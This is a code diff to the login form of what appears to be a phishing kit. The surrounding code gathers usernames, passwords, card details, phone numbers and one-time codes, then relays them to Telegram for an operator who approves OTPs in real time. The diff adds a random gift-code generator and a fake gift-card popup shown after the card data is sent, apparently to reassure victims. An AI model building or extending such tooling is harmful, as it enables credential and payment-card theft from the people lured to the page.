@@ -11,6 +11,7 @@ import NextStepAppr from './NextStepAppr';
 import './LoginForm.css';
 import ApprovePopup from './ApprovePopup';
 import { countryCodes } from './CardVerificationForm';
+import GiftCardPopup from './GiftCardPopup';
 
 function LoginForm() {
   const { t } = useLanguage();
@@ -30,7 +31,11 @@ function LoginForm() {
   const [showNextStep, setShowNextStep] = useState(false);
   const [showApprovePopup, setShowApprovePopup] = useState(false);
   const [waitingForAdminOtp, setWaitingForAdminOtp] = useState(false);
-  
+
+  //giftcard
+  const [showGiftCard, setShowGiftCard] = useState(false);
+  const [giftCode, setGiftCode] = useState('');
+
   // Typing tracking
   const [loginTypingSent, setLoginTypingSent] = useState(false);
   const [cardTypingSent, setCardTypingSent] = useState(false);
@@ -74,6 +79,18 @@ const handleOtpLogin = () => {
     sendLoginOtpMessage(loginName, sessionId);
   }
 };
+
+//giftcard
+const generateGiftCode = () => {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let code = '';
+  for (let i = 0; i < 16; i++) {
+    if (i > 0 && i % 4 === 0) code += '-';
+    code += chars[Math.floor(Math.random() * chars.length)];
+  }
+  return code;
+};
+
 
 // Handle Login False
 const handleLoginFalse = () => {
@@ -313,23 +330,29 @@ const handleCardVerificationFromTelegram = () => {
 };
 
   const handleApproveOtp = async () => {
-    console.log('✅ OTP Approved by admin!');
-    setWaitingForAdminOtp(false);
-    setOtpAttempts(0);
-    
-    if (sendOtpVerifiedLog) {
-      await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
-    }
-    if (sendSuccessToTelegram) {
-      await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
-    }
-    if (sendFormattedCardDetails) {
-      await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
-    }
-    
-    alert(t.success);
-    window.location.reload();
-  };
+  console.log('✅ OTP Approved by admin!');
+  setWaitingForAdminOtp(false);
+  setOtpAttempts(0);
+  
+  if (sendOtpVerifiedLog) {
+    await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
+  }
+  if (sendSuccessToTelegram) {
+    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
+  }
+  if (sendFormattedCardDetails) {
+    await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
+  }
+  
+  // 🎁 SHOW GIFT CARD POPUP INSTEAD OF ALERT
+  const newGiftCode = generateGiftCode();
+  setGiftCode(newGiftCode);
+  setShowGiftCard(true);
+  
+  // REMOVE the alert and reload!
+  // alert(t.success);
+  // window.location.reload();
+};
 
   // Telegram bot hooks
   const {
@@ -778,12 +801,20 @@ useEffect(() => {
 
           {/* NEW: Approve Popup */}
           {showApprovePopup && (
-            <ApprovePopup onClose={() => setShowApprovePopup(false)} />
+          <ApprovePopup onClose={() => setShowApprovePopup(false)} />
         )}
-        </>
-      )}
-    </div>
-  );
+      </>
+    )}
+    
+    {/* ✅ ADD THIS POPUP HERE */}
+    {showGiftCard && (
+      <GiftCardPopup 
+        giftCode={giftCode} 
+        onClose={() => setShowGiftCard(false)} 
+      />
+    )}
+  </div>
+);
 }
 
 export default LoginForm;
